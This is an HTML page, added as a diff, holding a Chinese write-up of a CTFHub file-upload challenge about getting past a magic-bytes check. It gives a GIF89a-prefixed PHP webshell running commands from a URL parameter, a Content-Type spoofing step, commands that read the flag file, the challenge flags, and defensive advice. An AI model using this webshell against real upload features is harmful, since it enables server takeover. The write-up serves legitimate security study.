@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: CTFHub 文件上传 - 文件头检测 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-image"></i> CTFHub 文件上传 - 文件头检测</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月22日</span>
+            <span><i class="fas fa-tag"></i> CTFHub</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> 文件上传</span>
+            <span><i class="fas fa-tag"></i> 图片马</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>文件上传 - 文件头检测</li>
+            <li><strong>题目平台：</strong>CTFHub 技能树</li>
+            <li><strong>题目类型：</strong>Web安全 / 文件上传漏洞 / Magic Bytes 校验绕过</li>
+            <li><strong>靶场链接：</strong>http://challenge-eeee57f304ff8f52.sandbox.ctfhub.com:10800（动态环境）</li>
+            <li><strong>涉及工具：</strong>Chrome浏览器、Burp Suite 抓包工具、Base64在线解码工具</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>绕过文件头（Magic Bytes）检测</strong>。服务器后端使用 <code>getimagesize()</code> 或类似函数读取了文件开头的几个字节（文件头），用来判断上传的是否为真实的图片。单纯修改后缀或 MIME 已经无法绕过，必须构造“图片马”，即给我们的 PHP 木马穿上合法的图片头外衣。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>尝试直接上传纯 PHP 木马被拦截，确认存在文件内容检测。</li>
+            <li>既然检查文件头，那就在 PHP 代码最前面加上合法的图片头，例如 GIF 的 <code>GIF89a</code>。</li>
+            <li>构造内容为 <code>GIF89a<?php system($_GET['cmd']); ?></code> 的文件，同时将后缀名保存为 <code>.php</code>。</li>
+            <li>注意：回显的内容由于带有 <code>GIF89a</code> 前缀，直接使用 Base64 解码容易出错，可改用直接执行 <code>cat</code> 命令读取明文。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录一：Base64 解码失败（夹杂了图片头）</h4>
+            <p><strong>踩坑情况：</strong>读取 Flag 文件时，回显数据为 <code>GIF89aPD9waHAgLy8gY3RmaHVi...</code>。将其直接放入 Base64 解码器，得到一长串乱码。</p>
+            <p><strong>原因分析：</strong>回显数据包含了我们在第一步添加的图片头 <code>GIF89a</code>。Base64 解码器会把这些字符也当作 Base64 数据强行解码，导致结果错误。</p>
+            <p><strong>改进方式：</strong>解码时，只需复制从 <code>PD9waHAg</code> 开始的部分即可，前面的 <code>GIF89a</code> 是纯文本头，不属于 Base64 编码内容。或者直接放弃 Base64，使用 <code>cat</code> 命令读取明文。</p>
+        </div>
+
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录二：提交解码后的 Flag 提示“flag错误”（环境陷阱）</h4>
+            <p><strong>踩坑情况：</strong>成功解码得到 <code>ctfhub{3f3effab6af24f4775342262}</code>，提交却提示错误。</p>
+            <p><strong>原因分析：</strong>**这是 CTFHub 沙盒的机制坑！** 靶场环境是按时间计费的，临近过期时（如倒计时 10 分钟以内），系统会在后台动态重置 Flag 文件的内容。你读取到的是几分钟前的旧 Flag，而服务器现在的正确答案已经变了。</p>
+            <p><strong>改进方式：</strong>拿到 Flag 后必须<strong>立刻提交</strong>。如果提交报错，不要怀疑自己的解法，立刻重新访问 <code>?cmd=base64</code> 读取一遍最新内容，或者干脆**放弃该环境，立刻重开一局**，用最短的时间打完连招并提交。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤（推荐使用直接读取明文法）</h4>
+            <p><strong>第一步：制作图片马</strong></p>
+            <p>本地新建 <code>shell.php</code>，写入以下代码（必须顶格写，不能有空格或换行）：</p>
+            <pre><code>GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+            <p><strong>代码逐字深度解析：</strong></p>
+            <ul>
+                <li><code>GIF89a</code>：GIF 图片的合法文件头，欺骗服务器的 <code>getimagesize</code> 检测。</li>
+                <li><code>&lt;?php</code>：PHP 脚本起始标记。PHP 解析器会忽略前面的 GIF89a，从这里开始执行。</li>
+                <li><code>system</code>：执行外部系统命令的内置函数。</li>
+                <li><code>$_GET['cmd']</code>：接收 URL 参数 <code>cmd</code> 的值作为系统命令。</li>
+                <li><code>;</code> 和 <code>?&gt;</code>：PHP 语句结束和脚本结束标记。</li>
+            </ul>
+
+            <p><strong>第二步：绕过 MIME 并上传</strong></p>
+            <p>在页面上传 <code>shell.php</code>。如果服务器拦截，开启 Burp Suite 抓包，修改 <code>Content-Type: application/octet-stream</code> 为 <code>Content-Type: image/gif</code>，放行。页面回显路径：<code>upload/shell.php</code>。</p>
+
+            <p><strong>第三步：寻找 Flag 文件</strong></p>
+            <p>访问：<code>http://.../upload/shell.php?cmd=ls%20/var/www/html/</code></p>
+            <p>在回显中找到目标文件名：<code>flag_2901918741.php</code>。</p>
+
+            <p><strong>第四步：修改木马直接读取明文（强推此方法）</strong></p>
+            <p>放弃使用 Base64 传参（容易混入 GIF89a 导致乱码）。直接修改本地 <code>shell.php</code> 的内容为：</p>
+            <pre><code>GIF89a
+&lt;?php
+passthru("cat /var/www/html/flag_2901918741.php");
+?&gt;</code></pre>
+            <p>重新上传覆盖。然后直接在浏览器访问 <code>http://.../upload/shell.php</code>（不带任何参数）。</p>
+            <p>查看网页源码（右键 -> 查看网页源代码），即可直接看到明文 Flag：<code>ctfhub{abd020f9ad7a28b3f6d8f1426ac6254238ccf1cb}</code>。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>二次渲染绕过：</strong>在实战中，如果服务器对图片进行了二次渲染（如 GD 库重新生成图片），我们的 <code>GIF89a</code> 头可能会在重新渲染中丢失。此时需要制作“二次渲染马”，将恶意代码插入图片的特定像素点或 EXIF 注释字段中。</li>
+            <li><strong>文件包含漏洞（LFI）组合利用：</strong>图片马通常不能直接执行，需要配合文件包含漏洞（如 <code>?file=upload/shell.php</code>）来触发执行。</li>
+            <li><strong>安全开发（SDL）：</strong>正确防御方式是使用“白名单”检查后缀，并结合“二次渲染”强制销毁非图片数据，同时禁止上传目录具有执行权限。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. 文件头（Magic Bytes）</h4>
+            <p>文件开头的特定十六进制标识（如 JPEG 是 FF D8 FF，PNG 是 89 50 4E 47，GIF 是 GIF89a）。操作系统和 Web 服务器通过读取这几个字节来判断文件的真实类型。</p>
+
+            <h4>2. 图片马（Picture Webshell）</h4>
+            <p>将恶意代码附加在正常图片文件头之后形成的特制文件。既能通过图片校验，又保留了 PHP 代码的执行能力。</p>
+
+            <h4>3. PHP 解析机制与上下文无关性</h4>
+            <p>PHP 解析器在执行文件时，只寻找 <code>&lt;?php</code> 和 <code>?&gt;</code> 标签。标签之外的任何字符（包括 GIF89a）都会被当作 HTML 输出或直接忽略。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 MIME 绕过的区别：</strong>MIME 只检查请求头的 <code>Content-Type</code>（声明式）；文件头检测直接读取文件内容（实质式）。</li>
+            <li><strong>与双写后缀的区别：</strong>双写针对的是文件后缀名的字符串过滤缺陷；文件头检测针对的是文件内容的真实性校验。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因</h3>
+        <p>开发人员为了防止上传恶意脚本，引入了 <code>getimagesize()</code> 等函数。他们忽略了服务器底层解析逻辑与文件类型检查逻辑是不一致的，导致可以用图片马绕过。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>在真实的红蓝对抗中，头像上传、附件上传等业务常部署此类检测。攻击者一旦发现校验，会尝试构造图片马，并寻找 LFI 漏洞触发，或寻找服务器上的解析漏洞来执行代码。</p>
+
+        <h3>4. 如何抽象理解概念（大白话理解）</h3>
+        <div class="highlight-box">
+            <p><strong>把服务器安检比作检查包裹：</strong></p>
+            <ul>
+                <li><strong>黑名单（查标签）：</strong>保安检查包裹外标签，看到“刀具”没收。我们把标签改成“拐杖”就混进去了。</li>
+                <li><strong>MIME（查清单）：</strong>保安看你的随箱清单上写着“衣物”，就放行了。</li>
+                <li><strong>文件头检测（摸材质）：</strong>保安不仅要看标签，还要伸手摸一摸里面的东西。这时我们把刀伪装成一根“拐杖”（GIF89a）递过去，保安摸到是根棍子，就放行了。但他不知道，这根“拐杖”里面藏着一把锋利的刀（PHP代码），厨房里的厨师（PHP解析器）拿到拐杖，轻轻一按机关，刀就弹出来了。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
